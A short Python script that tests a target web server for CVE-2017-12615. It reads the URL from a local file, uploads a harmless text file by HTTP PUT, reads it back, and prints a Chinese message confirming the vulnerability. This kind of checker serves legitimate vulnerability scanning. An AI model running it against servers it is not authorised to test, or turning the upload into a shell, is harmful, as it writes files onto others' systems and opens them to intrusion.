import requests

class CVE_2017_12615:
    def __init__(self):
        with open('../opt/前端传url.txt','r') as file:
            self.url = file.readline()
        self.hearders = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        }
        self.payload = self.url + "/10.txt"
        self.data = {"hello":"world"}
    
    def start(self):
        requests.put(url=self.payload,data=self.data,headers=self.hearders)
        respones = requests.get(url=self.payload,headers=self.hearders)
        res = respones.text
        if res == "hello=world":
            a = "存在CVE-2017-12615漏洞"
            print(a)
            return a

cve = CVE_2017_12615()
cve.start()